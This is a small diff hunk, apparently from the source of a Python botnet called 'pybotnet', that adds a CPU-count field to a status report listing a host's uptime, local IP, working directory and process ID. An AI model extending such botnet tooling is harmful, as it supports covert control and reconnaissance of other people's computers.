@@ -91,6 +91,7 @@ Up Time: {pybotnet_uptime} Seconds
 Local ip: {get_host_name_ip()}
 Current Route: {os.getcwd()}
 Pid: {os.getpid()}
+cpu count: {os.cpu_count()}
 Pybotnet Version: {settings.pybotnet_version}
 -----------------------"""
 
